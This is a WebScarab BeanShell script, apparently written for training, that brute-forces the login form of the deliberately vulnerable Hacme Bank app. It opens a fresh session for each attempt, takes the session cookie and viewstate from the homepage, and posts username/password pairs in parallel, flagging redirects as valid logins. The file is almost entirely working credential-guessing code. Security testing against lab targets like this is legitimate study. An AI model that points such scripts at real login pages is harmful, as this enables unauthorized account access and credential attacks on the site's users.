import org.owasp.webscarab.model.ConversationID;
import org.owasp.webscarab.model.HttpUrl;
import org.owasp.webscarab.model.Request;
import org.owasp.webscarab.model.Response;

import org.owasp.webscarab.util.Encoding;
import org.owasp.webscarab.model.NamedValue;

// Beanshell script by Chuck Willis (chuck at securityfoundry dot com)
// for use with WebScarab by Rogan Dawes 
// http://www.owasp.org/software/webscarab.html
// Use this script at your own risk, by using it you accept all liability.

// This script is heavily based on Rogan's example script that comes
// with WebScarab and help he gave me via email.  Thanks Rogan!

// This script will brute force the log in form to a copy of Foundstone's Hacme Bank
// (http://www.foundstone.com/resources/proddesc/hacmebank.htm)
// It is meant as a proof of concept for brute forcing form values.

// This script works by establishing a new session for each request, getting
// a new cookie each time.  So, each brute force attempt makes two requests,
// one to get the homepage and then another to post the login attempt using the
// cookie and viewstate taken from the initial request.

// Since this script does not log all requests made to the web site,
// you may want to try running this script through another proxy
// to get a better feel for what it is doing.

// !! this script seems a bit buggy... use at your own risk

// !! you must configure the URL variable below to make this script work !!

String hacmebankURL = "http://192.168.1.2/hacmebank/";

// define subroutines BEFORE the main part of the script executes,
// otherwise they won't be found
long timeSlept = 0; // amount of time spent sleeping...

// call this to fetch the requests one after another
void fetchSequentially() {
    while (hasMoreRequests()) {
        request = getNextRequest();
        response = scripted.fetchResponse(request);
        out.println("Conversation " + scripted.addConversation(response));
    }
}

// call this to fetch them in parallel
// the number of simultaneous connections is controlled by the Scripting plugin 
// It is currently fixed at 4 simultaneous requests

void fetchParallel() {
    while (hasMoreRequests() || scripted.isAsyncBusy()) {
        while (scripted.hasAsyncCapacity() && hasMoreRequests()) {
            scripted.submitAsyncRequest(getNextRequest());
        }
        if (scripted.hasAsyncResponse()) {
            while (scripted.hasAsyncResponse()) {
                Response response = scripted.getAsyncResponse();
                //request = response.getRequest();
                handleResponse(response);
                //out.println("Conversation " + scripted.addConversation(response));
                //scripted.addConversation(response);
            }
        } else {
					timeSlept= timeSlept+10;
					Thread.sleep(10);
				}
    }
}

/******************************************************************************
 ***************** USER EDITABLE SCRIPT STARTS HERE ***************************
 *                                                                            *
 * Of course, you can modify the bits above, but you shouldn't need           *
 * to, if you follow the algorithm suggested below.                           *
 *                                                                            *
 ******************************************************************************/

boolean showBadLogins = false; // if true, show invalid login combos
boolean scriptDebug = false; // if true, more details are printed...
boolean tryEachCombo = false; // if true, try each username with each password
	// otherwise, just try each username with the associated password

List phase1SessionList = new ArrayList();

//String[] listOfUsernames = { "test", "jc" };
// String[] listOfPasswords = { "test", "jc789" };
String[] listOfUsernames = { "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" };
String[] listOfPasswords = { "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a" };

//String[] listOfUsernames = { "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" , "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" };
//String[] listOfPasswords = { "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a", "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a" };

int currentuserindex = 0;
int currentpasswordindex = 0;
boolean triedAll = false;

String[] getUsernamePassword() {
	String[] toReturn = new String[2];
	if(scriptDebug) out.println("called getUsername with currentuserindex=" +
		currentuserindex + " currentpasswordindex=" + currentpasswordindex);
	if(currentuserindex == listOfUsernames.length-1 && currentpasswordindex == listOfPasswords.length-1)
	{
	 triedAll = true;
	  toReturn[0] = listOfUsernames[currentuserindex];
		toReturn[1] = listOfPasswords[currentpasswordindex];
 	} else if(currentuserindex < listOfUsernames.length) {
		toReturn[0] = listOfUsernames[currentuserindex++];
		toReturn[1] = listOfPasswords[currentpasswordindex];
		//return { listOfUsernames[currentuserindex++], listOfPasswords[currentpasswordindex] };
	} else if (currentpasswordindex < listOfPasswords.length) {
  	currentuserindex = 0;
  	toReturn[0] = listOfUsernames[currentuserindex++];
		toReturn[1] = listOfPasswords[++currentpasswordindex];
    //return { listOfUsernames[currentuserindex++], listOfPasswords[++currentpasswordindex] };
	} else {
   // error
	}
	if(scriptDebug) out.println("returning username=" + toReturn[0] + " password=" + toReturn[1]);
	return toReturn;
}
	

public boolean hasMoreRequests() {
   //return !triedAll || !phase1SessionList.isEmpty();
   return !triedAll;
}

public Request getNextRequest() {
   if (phase1SessionList.size() < 10) return createPhase1Request();
   return createPhase2Request();
}

public void handleResponse(Response response) {
 Request request = response.getRequest();
 // if(scriptDebug) out.println("Handling Response to Request: " + request.toString());
 if (response.getRequest().getMethod().equals("GET")) { // if response to a phase 1 request
   phase1SessionList.add(response);
 } else { // otherwise was a response to a login post...
   // check if we were successful doing whatever we are trying
   if(response.getStatus().equals("200")) { // if response is status 200, it is was a bad attempt
	// sucesses get back a 302 redirect
      // if we are supposed to show bad login attempts, do it
		if (showBadLogins) out.println("   Bad Login: " + new String(response.getRequest().getContent()));
	} else {
		out.println("! Valid Login: " + new String(response.getRequest().getContent()));
	}
 }
}

public Request createPhase1Request() {
  // formulate homepage request
 return requestURL(hacmebankURL);
}

public Request createPhase2Request() {
 	// pop Phase1 response from list
	Response homepage = phase1SessionList.remove(0);
 	// get a cookie from response
 	String cookie = getCookie("ASP.NET_SessionId", homepage);
	if(scriptDebug) out.println("Parsed Cookie:" + cookie);
	// get viewstate from response
	String viewstate = getFormValue("__VIEWSTATE", homepage);
	if(scriptDebug) out.println("Parsed Viewstate:" + viewstate);
	// get a username from the list
 	// get a password from the list
	String[] userandpw = getUsernamePassword();
	// formulate it into a request
	return makeLogin(hacmebankURL + "Login.aspx",
		cookie, viewstate, userandpw[0], userandpw[1]);

}

Request requestURL(String url) {
	Request request = new Request();
	request.setMethod("GET");
	request.setVersion("HTTP/1.0");
	request.setHeader("User-Agent","WebScarab");
	request.setURL(new HttpUrl(url));
	return request;
}


// this function would be a lot easier if it was not possible for the server to
// return more than one Set-Cookie header...we could just call response.getHeader("Set-Cookie");
String getCookie(String cookiename, Response response) {
	NamedValue[] headers = response.getHeaders();
	String cookievalue = null;
	for (int i=0; i<headers.length; i++) {
	  //if(scriptDebug) out.println("HeaderName: " + headers[i].getName() + " HeaderValue: " + headers[i].getValue());
		if (headers[i].getName().equalsIgnoreCase("Set-Cookie")) {
		  if (headers[i].getValue().startsWith(cookiename)) { // if header value starts with the cookiename
        cookievalue = headers[i].getValue().substring(headers[i].getValue().indexOf("=")+1,
				 	headers[i].getValue().indexOf(";"));
      }
  	}
	}
  return cookievalue;
}

// this function will only return the first instance of the form value name
// and will probably choke if valuename appears in regular text before it appears
// in a form
String getFormValue(String valuename, Response response) {
	String resp = response.toString();
	int startname = resp.indexOf(valuename); // index of first character of the value name
	// example line : <input type="hidden" name="name"    value="value" />
	// end of form value name and beginning of form value ...
	int startvalue = resp.indexOf("\"", startname+valuename.length()+1) + 1; // index of the
	  // first character of the value
	return resp.substring(startvalue,
		resp.indexOf("\"", startvalue)); // substring does not include the final ", so this is correct
		  // no -1 needed

}

// make the login request.
Request makeLogin(String url, String cookie, String viewstate, String username, String password) {
	Request request = new Request();
	request.setMethod("POST");
	request.setVersion("HTTP/1.0");
	//request.setHeader("Host", "192.168.1.1");
	request.setHeader("User-Agent","WebScarab");
	request.setHeader("Content-Type", "application/x-www-form-urlencoded");
	request.setHeader("Cookie","ASP.NET_SessionId="+cookie+"; CookieLoginAttempts=4");
	request.setURL(new HttpUrl(url));
	String body = new String("__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE="+
		Encoding.urlEncode(viewstate) +
		"&txtUserName=" + Encoding.urlEncode(username) +
		"&txtPassword=" + Encoding.urlEncode(password) +
		"&btnSubmit=Submit");
	request.setHeader("Content-Length",body.length().toString());
	request.setContent(body.getBytes());
	//if(scriptDebug) out.println("Made Request:" + request.toString());
//	Response response = scripted.fetchResponse(request);
	return request;
}

// Choose how to submit the requests, sequentially, or in parallel

// fetchSequential();
out.println(" -------------- Starting new Run -------------- ");
long startTime = System.currentTimeMillis();
fetchParallel();
long elapsedTime = System.currentTimeMillis() - startTime;
out.println("Checked " + (listOfUsernames.length*listOfPasswords.length) +
	" combos in " + elapsedTime/1000.0 + " seconds (of which " + timeSlept/1000.0 +
	" seconds were sleeping)");

